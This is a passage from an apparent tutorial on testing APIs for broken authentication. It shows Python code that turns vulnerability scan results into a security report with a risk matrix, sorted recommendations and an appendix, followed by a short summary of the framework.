            'risk_assessment': self.generate_risk_assessment(),
            'recommendations': self.generate_recommendations(),
            'appendix': self.generate_appendix()
        }
        
        return self.report
    
    def generate_risk_assessment(self):
        """Generate risk assessment matrix"""
        risk_matrix = {
            'critical': {
                'count': len(self.scan_results.get('critical', [])),
                'business_impact': 'Critical',
                'likelihood': 'High',
                'recommended_timeline': 'Immediate'
            },
            'high': {
                'count': len(self.scan_results.get('high', [])),
                'business_impact': 'High',
                'likelihood': 'Medium-High',
                'recommended_timeline': '1-2 weeks'
            },
            'medium': {
                'count': len(self.scan_results.get('medium', [])),
                'business_impact': 'Medium',
                'likelihood': 'Medium',
                'recommended_timeline': '1 month'
            },
            'low': {
                'count': len(self.scan_results.get('low', [])),
                'business_impact': 'Low',
                'likelihood': 'Low',
                'recommended_timeline': '3 months'
            }
        }
        
        return risk_matrix
    
    def generate_recommendations(self):
        """Generate actionable recommendations"""
        recommendations = {
            'immediate_actions': [],
            'short_term_actions': [],
            'long_term_improvements': []
        }
        
        # Categorize recommendations based on severity
        for severity, vulnerabilities in self.scan_results.items():
            for vuln in vulnerabilities:
                recommendation = {
                    'vulnerability': vuln.get('type'),
                    'action': self.get_remediation(vuln.get('type'))
                }
                
                if severity in ['critical', 'high']:
                    recommendations['immediate_actions'].append(recommendation)
                elif severity == 'medium':
                    recommendations['short_term_actions'].append(recommendation)
                else:
                    recommendations['long_term_improvements'].append(recommendation)
        
        return recommendations
    
    def generate_appendix(self):
        """Generate report appendix"""
        return {
            'testing_methodology': 'Comprehensive API authentication security assessment',
            'tools_used': ['Custom Python scripts', 'JWT toolkit', 'OAuth testing tools'],
            'scope': self.company_info.get('scope', 'All authentication endpoints'),
            'contact_information': self.company_info.get('contact', 'Security Team')
        }

# Report Generation Example
company_info = {
    'name': 'Example API Service',
    'date': '2024-01-15',
    'scope': 'All authentication and session management endpoints',
    'contact': 'security@example.com'
}

# Assuming scan_results from previous scanning
report_generator = SecurityReportGenerator(vulnerabilities, company_info)
comprehensive_report = report_generator.generate_comprehensive_report()

# Print report summary
exec_summary = comprehensive_report['executive_summary']
print(f"Security Assessment for: {exec_summary['company_name']}")
print(f"Overall Risk: {exec_summary['overall_risk_level']}")
print(f"Critical Issues: {exec_summary['critical_vulnerabilities']}")
print(f"High Issues: {exec_summary['high_vulnerabilities']}")
```

This comprehensive API Broken Authentication testing framework provides security professionals with advanced tools and methodologies to identify, exploit, and report authentication vulnerabilities in modern API implementations. The framework covers JWT security, OAuth 2.0 testing, credential management, session security, and provides actionable remediation guidance.